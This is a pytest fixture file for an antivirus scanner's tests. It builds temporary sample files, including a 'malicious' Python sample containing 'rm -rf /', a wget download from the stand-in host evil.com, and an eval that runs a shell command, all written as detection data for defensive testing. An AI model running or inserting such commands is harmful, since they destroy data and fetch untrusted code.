"""Pytest fixtures for antivirus tests."""

import pytest
import tempfile
import shutil
from pathlib import Path


@pytest.fixture
def temp_dir():
    """Create a temporary directory for tests."""
    dirpath = tempfile.mkdtemp()
    yield Path(dirpath)
    shutil.rmtree(dirpath, ignore_errors=True)


@pytest.fixture
def sample_file(temp_dir):
    """Create a sample text file."""
    file_path = temp_dir / "sample.txt"
    file_path.write_text("This is a sample file for testing.")
    return file_path


@pytest.fixture
def malicious_file(temp_dir):
    """Create a file with malicious patterns."""
    file_path = temp_dir / "malicious.py"
    file_path.write_text("""
import os
import subprocess

def evil():
    os.system("rm -rf /")
    subprocess.call(["wget", "http://evil.com/malware"])
    eval("__import__('os').system('whoami')")
""")
    return file_path


@pytest.fixture
def high_entropy_file(temp_dir):
    """Create a file with high entropy (random bytes)."""
    import os
    file_path = temp_dir / "random.bin"
    file_path.write_bytes(os.urandom(1024))
    return file_path


@pytest.fixture
def clean_config(temp_dir, monkeypatch):
    """Use a clean config directory for tests."""
    config_dir = temp_dir / ".antivirus"
    config_dir.mkdir(parents=True, exist_ok=True)

    # Patch Path.home() to return temp_dir
    monkeypatch.setattr(Path, "home", lambda: temp_dir)

    return config_dir
